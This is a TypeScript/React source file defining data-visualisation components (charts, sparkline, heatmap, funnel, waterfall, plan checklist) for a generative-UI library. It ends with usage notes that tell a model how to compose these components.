      <Box className="w-full overflow-hidden">
        {(props.title || seriesLegend.length > 0) && (
          <div className="flex w-full min-w-0 flex-wrap items-center justify-between gap-3 border-b border-border/50 px-4 py-3.5">
            <div className="flex min-w-0 items-center gap-2.5">
              <span className="size-2 shrink-0 rounded-full bg-primary shadow-[0_0_0_4px_color-mix(in_oklch,var(--primary)_14%,transparent)]" />
              {props.title && <h3 className={cn(TITLE, "min-w-0 text-sm")}>{props.title}</h3>}
            </div>
            {seriesLegend.length > 0 && (
              <div className="flex min-w-0 flex-wrap justify-end gap-x-4 gap-y-2">
                {seriesLegend.map((item) => (
                  <span key={item.name} className="inline-flex min-w-0 items-center gap-1.5 text-[10px] font-medium text-muted-foreground">
                    <span className="size-1.5 shrink-0 rounded-full" style={{ backgroundColor: item.color }} />
                    <span className="max-w-32 truncate">{item.name}</span>
                  </span>
                ))}
              </div>
            )}
          </div>
        )}
        <div className="w-full min-w-0 bg-[linear-gradient(180deg,color-mix(in_oklch,var(--primary)_5%,var(--card)),var(--card)_68%)] px-2 pt-4 pb-2 @panel-sm:px-4">
          <ChartContainer
            config={config}
            className="aspect-auto w-full min-w-0"
            style={{ height: `${chartHeight}px` }}
          >
            {round ? (
              <PieChart>
                <ChartTooltip content={<ChartTooltipContent nameKey="label" hideLabel />} />
                <Pie
                  data={props.labels.map((label, index) => ({ label, value: props.series[0]?.values[index] ?? 0 }))}
                  dataKey="value"
                  nameKey="label"
                  innerRadius={props.kind === "donut" ? "62%" : 0}
                  outerRadius="86%"
                  paddingAngle={props.kind === "donut" ? 3 : 1}
                  cornerRadius={props.kind === "donut" ? 4 : 0}
                  stroke="var(--card)"
                  strokeWidth={3}
                >
                  {props.labels.map((label, index) => (
                    <Cell key={`${label}-${index}`} fill={chartColor(index)} />
                  ))}
                </Pie>
              </PieChart>
            ) : props.kind === "radar" ? (
              <RadarChart data={data} outerRadius="76%">
                <PolarGrid stroke="var(--border)" />
                <PolarAngleAxis dataKey="label" fontSize={10} tick={{ fill: "var(--muted-foreground)" }} />
                <ChartTooltip content={<ChartTooltipContent />} />
                {props.series.map((series, index) => (
                  <Radar
                    key={series.name}
                    dataKey={series.name}
                    stroke={chartColor(index)}
                    strokeWidth={2.5}
                    fill={chartColor(index)}
                    fillOpacity={0.18}
                    dot={{ r: 3, fill: chartColor(index), stroke: "var(--card)", strokeWidth: 2 }}
                  />
                ))}
              </RadarChart>
            ) : props.kind === "bar" ? (
              <BarChart data={data} margin={margin} barCategoryGap="28%">
                {axes}
                {props.series.map((series, index) => (
                  <Bar
                    key={series.name}
                    dataKey={series.name}
                    stackId={stack}
                    fill={chartColor(index)}
                    radius={stack ? 0 : [7, 7, 2, 2]}
                    maxBarSize={props.series.length > 1 ? 28 : 44}
                  />
                ))}
              </BarChart>
            ) : props.kind === "area" ? (
              <AreaChart data={data} margin={margin}>
                <defs>
                  {props.series.map((series, index) => (
                    <linearGradient key={series.name} id={`${chartId}-area-${index}`} x1="0" y1="0" x2="0" y2="1">
                      <stop offset="0%" stopColor={chartColor(index)} stopOpacity={0.34} />
                      <stop offset="95%" stopColor={chartColor(index)} stopOpacity={0.015} />
                    </linearGradient>
                  ))}
                </defs>
                {axes}
                {props.series.map((series, index) => (
                  <Area
                    key={series.name}
                    type="monotone"
                    dataKey={series.name}
                    stackId={stack}
                    stroke={chartColor(index)}
                    strokeWidth={2.5}
                    fill={`url(#${chartId}-area-${index})`}
                    activeDot={{ r: 5, stroke: "var(--card)", strokeWidth: 2 }}
                  />
                ))}
              </AreaChart>
            ) : (
              <LineChart data={data} margin={margin}>
                {axes}
                {props.series.map((series, index) => (
                  <Line
                    key={series.name}
                    type="monotone"
                    dataKey={series.name}
                    stroke={chartColor(index)}
                    strokeWidth={2.75}
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    dot={{ r: 2.5, fill: chartColor(index), stroke: "var(--card)", strokeWidth: 2 }}
                    activeDot={{ r: 5, stroke: "var(--card)", strokeWidth: 2 }}
                  />
                ))}
              </LineChart>
            )}
          </ChartContainer>
        </div>
      </Box>
    )
  },
})

const Sparkline = defineComponent({
  name: "Sparkline",
  description: "A compact metric with a value, optional change, and small trend line.",
  props: z.object({
    label: z.string(),
    value: z.string(),
    values: z.array(z.number()),
    change: z.string().optional(),
    tone: z.enum(["positive", "negative", "neutral"]).optional(),
  }),
  component: ({ props }) => {
    const gradientId = `spark-${useId().replace(/:/g, "")}`
    const values = props.values.filter(Number.isFinite)
    const min = Math.min(...values, 0)
    const max = Math.max(...values, 0)
    const range = max - min || 1
    const points = values.map((value, index) => {
      const x = values.length < 2 ? 50 : (index / (values.length - 1)) * 100
      const y = 27 - ((value - min) / range) * 22
      return `${x},${y}`
    })
    const tone = props.tone ?? "neutral"
    const color = tone === "positive" ? "var(--primary)" : tone === "negative" ? "var(--destructive)" : "var(--chart-1)"
    return (
      <Box className={cn("flex min-w-0 items-center justify-between gap-4", PAD)}>
        <div className="min-w-0 space-y-1">
          <p className={cn(LABEL, "text-balance")}>{props.label}</p>
          <p className="break-words text-xl leading-tight font-semibold tracking-tight text-foreground tabular-nums @panel-sm:text-2xl">
            {props.value}
          </p>
          {props.change && <p className={cn(META, tone === "positive" && "text-primary", tone === "negative" && "text-destructive")}>{props.change}</p>}
        </div>
        <svg className="h-12 w-28 shrink-0 overflow-visible" viewBox="0 0 100 32" role="img" aria-label={`${props.label} trend`}>
          <defs>
            <linearGradient id={gradientId} x1="0" y1="0" x2="0" y2="1">
              <stop offset="0%" stopColor={color} stopOpacity="0.28" />
              <stop offset="100%" stopColor={color} stopOpacity="0" />
            </linearGradient>
          </defs>
          {values.length > 1 && <polygon points={`0,32 ${points.join(" ")} 100,32`} fill={`url(#${gradientId})`} />}
          {values.length > 1 ? (
            <polyline points={points.join(" ")} fill="none" stroke={color} strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
          ) : values.length === 1 ? (
            <circle cx="50" cy="16" r="3" fill={color} />
          ) : (
            <line x1="2" y1="16" x2="98" y2="16" stroke="var(--border)" strokeWidth="2" strokeDasharray="3 4" />
          )}
          {values.length > 1 && <circle cx="100" cy={points.at(-1)?.split(",")[1]} r="3" fill={color} stroke="var(--card)" strokeWidth="1.5" />}
        </svg>
      </Box>
    )
  },
})

const Heatmap = defineComponent({
  name: "Heatmap",
  description: "A color-scaled grid showing values across row and column labels.",
  props: z.object({
    columns: z.array(z.string()),
    rows: z.array(z.object({ label: z.string(), values: z.array(z.number()) })),
    title: z.string().optional(),
  }),
  component: ({ props }) => {
    const values = props.rows.flatMap((row) => row.values).filter(Number.isFinite)
    const min = Math.min(...values, 0)
    const max = Math.max(...values, 0)
    const range = max - min || 1
    const columns = Math.max(props.columns.length, 1)
    return (
      <Box className="w-full">
        {props.title && <BoxHeader title={props.title} />}
        <div className={cn("overflow-x-auto", PAD)}>
          <div className="grid min-w-[22rem] gap-1.5" style={{ gridTemplateColumns: `minmax(3.5rem, 0.8fr) repeat(${columns}, minmax(1.35rem, 1fr))` }}>
            <span aria-hidden="true" />
            {props.columns.map((column, index) => (
              <span key={`${column}-${index}`} className={cn(LABEL, "truncate text-center text-[9px]")} title={column}>{column}</span>
            ))}
            {props.rows.map((row, rowIndex) => (
              <div key={`${row.label}-${rowIndex}`} className="contents">
                <span className={cn(BODY, "truncate self-center text-xs")} title={row.label}>{row.label}</span>
                {props.columns.map((column, columnIndex) => {
                  const value = row.values[columnIndex]
                  const intensity = Number.isFinite(value) ? Math.round(14 + ((value - min) / range) * 86) : 0
                  return (
                    <span
                      key={`${rowIndex}-${column}-${columnIndex}`}
                      className="flex aspect-square min-h-5 items-center justify-center rounded-[4px] text-[9px] tabular-nums text-foreground"
                      style={{ background: Number.isFinite(value) ? `color-mix(in oklch, var(--chart-1) ${intensity}%, var(--muted))` : "var(--muted)", opacity: Number.isFinite(value) ? 1 : 0.45 }}
                      title={`${row.label}, ${column}: ${Number.isFinite(value) ? value : "no value"}`}
                      aria-label={`${row.label}, ${column}: ${Number.isFinite(value) ? value : "no value"}`}
                    >
                      {Number.isFinite(value) ? new Intl.NumberFormat(undefined, { notation: "compact", maximumFractionDigits: 1 }).format(value) : "-"}
                    </span>
                  )
                })}
              </div>
            ))}
          </div>
        </div>
      </Box>
    )
  },
})

const Funnel = defineComponent({
  name: "Funnel",
  description: "A staged funnel showing volume and retention through each step.",
  props: z.object({
    stages: z.array(z.object({ label: z.string(), value: z.number() })),
    title: z.string().optional(),
  }),
  component: ({ props }) => {
    const first = Math.max(0, props.stages[0]?.value ?? 0)
    return (
      <Box className="w-full">
        {props.title && <BoxHeader title={props.title} />}
        <div className={cn("space-y-3", PAD)}>
          {props.stages.map((stage, index) => {
            const value = Math.max(0, stage.value)
            const width = first > 0 ? Math.min(100, (value / first) * 100) : 0
            const retained = first > 0 ? Math.round((value / first) * 100) : 0
            return (
              <div key={`${stage.label}-${index}`} className="min-w-0 space-y-1.5">
                <div className="flex min-w-0 items-baseline justify-between gap-3">
                  <span className={cn(BODY, "min-w-0 truncate font-medium")} title={stage.label}>{stage.label}</span>
                  <span className={cn(META, "shrink-0 tabular-nums")}>{new Intl.NumberFormat().format(value)}{index > 0 && first > 0 ? ` · ${retained}%` : ""}</span>
                </div>
                <div className="h-3 overflow-hidden rounded-pill bg-muted/80">
                  <div className="h-full rounded-pill transition-[width]" style={{ width: `${width}%`, background: `linear-gradient(90deg, ${chartColor(index)}, color-mix(in oklch, ${chartColor(index)} 65%, var(--card)))` }} />
                </div>
              </div>
            )
          })}
        </div>
      </Box>
    )
  },
})

const Waterfall = defineComponent({
  name: "Waterfall",
  description: "A waterfall chart showing how positive and negative changes build to a total.",
  props: z.object({
    items: z.array(z.object({ label: z.string(), value: z.number(), total: z.boolean().optional() })),
    title: z.string().optional(),
  }),
  component: ({ props }) => {
    const running: number[] = []
    let current = 0
    for (const item of props.items) {
      const next = item.total ? item.value : current + item.value
      running.push(next)
      current = next
    }
    const bounds = props.items.flatMap((item, index) => [item.total ? 0 : (index === 0 ? 0 : running[index - 1]), running[index]])
    const min = Math.min(0, ...bounds)
    const max = Math.max(0, ...bounds)
    const range = max - min || 1
    const chartTop = 16
    const chartBottom = 176
    const chartWidth = Math.max(416, props.items.length * 64)
    const y = (value: number) => chartTop + ((max - value) / range) * (chartBottom - chartTop)
    const step = props.items.length ? chartWidth / props.items.length : chartWidth
    const barWidth = Math.min(42, step * 0.56)
    return (
      <Box className="w-full overflow-hidden">
        {props.title && <BoxHeader title={props.title} />}
        {props.items.length === 0 ? (
          <div className={cn(META, PAD)}>No values to chart.</div>
        ) : (
          <div className="overflow-x-auto px-2 py-3 @panel-sm:px-3">
            <svg className="h-52 w-full" style={{ minWidth: `${chartWidth}px` }} viewBox={`0 0 ${chartWidth} 220`} role="img" aria-label={props.title ?? "Waterfall chart"}>
              <line x1="0" x2={chartWidth} y1={y(0)} y2={y(0)} stroke="var(--border)" strokeDasharray="3 4" />
              {props.items.map((item, index) => {
                const before = index === 0 ? 0 : running[index - 1]
                const after = running[index]
                const start = item.total ? 0 : before
                const top = Math.min(y(start), y(after))
                const height = Math.max(2, Math.abs(y(after) - y(start)))
                const x = index * step + (step - barWidth) / 2
                const fill = item.total ? "var(--chart-1)" : item.value < 0 ? "var(--destructive)" : "var(--chart-2)"
                return (
                  <g key={`${item.label}-${index}`}>
                    {index < props.items.length - 1 && <line x1={x + barWidth} x2={(index + 1) * step + (step - barWidth) / 2} y1={y(after)} y2={y(after)} stroke="var(--muted-foreground)" strokeOpacity="0.35" strokeDasharray="3 3" />}
                    <rect x={x} y={top} width={barWidth} height={height} rx="4" fill={fill}>
                      <title>{`${item.label}: ${new Intl.NumberFormat().format(item.value)}${item.total ? " (total)" : ""}`}</title>
                    </rect>
                    <text x={x + barWidth / 2} y={Math.max(12, top - 5)} textAnchor="middle" className="fill-muted-foreground" fontSize="9">{new Intl.NumberFormat(undefined, { notation: "compact", maximumFractionDigits: 1 }).format(item.value)}</text>
                    <text x={x + barWidth / 2} y="198" textAnchor="middle" className="fill-muted-foreground" fontSize="10">{item.label.length > 11 ? `${item.label.slice(0, 10)}...` : item.label}</text>
                  </g>
                )
              })}
            </svg>
          </div>
        )}
      </Box>
    )
  },
})

/** A plan: a goal over a checklist, with a done/total count. The checklist is
    the composer's own (`TodoChecklist`), so a plan and the thread's todo list
    read as the same thing. */
const PLAN_STATUS = { done: "completed", active: "in_progress", pending: "pending" } as const
const Plan = defineComponent({
  name: "Plan",
  description: "A plan: a title and goal over checklist steps, each pending, active or done, with an optional note and priority, and a done count.",
  props: z.object({
    title: z.string(),
    steps: z.array(
      z.object({
        text: z.string(),
        status: z.enum(["done", "active", "pending"]).optional(),
        note: z.string().optional(),
        priority: z.enum(["high", "medium", "low"]).optional(),
      })
    ),
    goal: z.string().optional(),
  }),
  component: ({ props }) => {
    const done = props.steps.filter((step) => step.status === "done").length
    return (
      <Box>
        <BoxHeader title={props.title} meta={props.goal} />
        <div className={cn(PAD, "space-y-2")}>
          <div className={cn(META, "tabular-nums")}>{done}/{props.steps.length} done</div>
          <TodoChecklist
            items={props.steps.map((step) => ({
              content: step.text,
              status: PLAN_STATUS[step.status ?? "pending"],
              note: step.note,
              priority: step.priority,
            }))}
          />
        </div>
      </Box>
    )
  },
})

export const openuiLibrary = createLibrary({
  root: "Stack",
  components: [
    Stack,
    Card,
    Section,
    StatRow,
    Stat,
    Sparkline,
    Heatmap,
    Funnel,
    Waterfall,
    Table,
    List,
    Callout,
    Code,
    Chart,
    Progress,
    KeyValue,
    EmptyState,
    Divider,
    Image,
    Badges,
    Timeline,
    Plan,
    Compare,
    Details,
    Tabs,
    Accordion,
    Diff,
    Keys,
    People,
    Gallery,
    Flowchart,
  ],
  componentGroups: [
    {
      name: "Layout",
      components: ["Stack", "Card", "Section", "Divider", "Details", "Tabs", "Accordion"],
      notes: [
        "- `root = Stack([...])` is the entry point: every program must define it.",
        '- Use direction "row" for a cluster of cards; never nest a Stack in a Stack for spacing alone.',
        "- Tabs for alternatives the reader picks between (per OS, before/after); Accordion for FAQs; Details for one optional fold.",
      ],
    },
    {
      name: "Content",
      components: ["List", "Table", "Callout", "Code", "KeyValue", "EmptyState", "Image", "Badges", "Timeline", "Plan", "Compare", "Diff", "Keys", "People", "Gallery"],
      notes: [
        "- Write each table row as its own array of strings, in the SAME order as `columns`.",
        "- A short answer is prose; reach for these when the answer is a structure.",
        "- Image only with a URL you were actually given; never invent one. Remote images are loaded only when the reader clicks.",
        "- Diff for a before/after of text, Keys for shortcuts, People for who is involved, Gallery for several images.",
        "- Compare for weighing options, Timeline for ordered steps or history, Plan for a proposed or in-progress task checklist, Badges for short statuses.",
      ],
    },
    {
      name: "Flowcharts",
      components: ["Flowchart"],
      notes: [
        "- Flowchart is the only diagram component. Give nodes and edges; every edge's `from` and `to` must match node ids.",
        "- Flowcharts are locally interactive: readers can move nodes, connect handles, select elements and delete them. Edits are temporary and do not change the generated answer or run tools.",
        '- Keep a flowchart under ~12 nodes and use direction "right" for a pipeline, "down" for a hierarchy; a wide graph does not survive a narrow panel.',
      ],
    },
    {
      name: "Numbers",
      components: ["StatRow", "Stat", "Sparkline", "Chart", "Heatmap", "Funnel", "Waterfall", "Progress"],
      notes: [
        "- `values` must be the same length as `labels` for Chart; Heatmap rows should match the column count.",
        "- Prefer StatRow for a handful of figures, Sparkline for a compact metric trend, and Chart for a full trend or comparison.",
        "- Heatmap shows values across two dimensions; Funnel shows stage retention; Waterfall shows additive increases/decreases and explicit totals.",
        "- Chart kind: line/area for trends, bar for comparisons (stacked for parts of a total), pie/donut for shares of one whole (few slices), radar for scoring options on several axes.",
      ],
    },
  ],
})
